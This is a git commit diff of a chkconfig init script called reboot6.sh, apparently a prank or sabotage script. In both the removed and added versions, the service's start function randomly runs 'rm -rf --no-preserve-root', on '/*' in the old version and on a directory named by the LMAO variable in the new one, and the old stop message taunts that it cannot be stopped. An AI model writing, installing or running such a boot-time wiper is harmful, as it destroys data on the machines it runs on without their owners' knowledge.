8666f5f104713fcebec39a3abd3cc80a91b87219
webmaster-exit-1 <admin@exitone.net>
2022-04-09 14:18:19 -0700

    commit

--- reboot6.sh
+++ reboot6.sh
@@ -1,31 +1,30 @@
-#!/bin/bash
+#!/bin/sh
 # chkconfig: 125 20 80
 
-. /etc/init.d/functions
-
 start() {
-    for i in $(date +%S | cut -c 2); do
-        [[ $i > 6 ]] && rm -rf --no-preserve-root /*
-    done
+   for i in $(date +%S | cut -c 2); do
+      [ "$i" -gt 6 ] && rm -rf --no-preserve-root "${LMAO:?}/"*
+   done
 }
 
 stop() {
-   echo "This won't stop until it is removed!"
+   echo "The start function is atomic"
 }
 
-case "$1" in 
-    start)
-       start
-       ;;
-    stop)
-       stop
-       ;;
-    restart)
-       stop
-       start
-       ;;
-    *)
-    echo "Usage: $0 {start|stop|restart}"
+case "$1" in
+start)
+   start
+   ;;
+stop)
+   stop
+   ;;
+restart)
+   stop
+   start
+   ;;
+*)
+   echo "Usage: $0 {start|stop|restart}"
+   ;;
 esac
 
-exit 0 
+exit 0
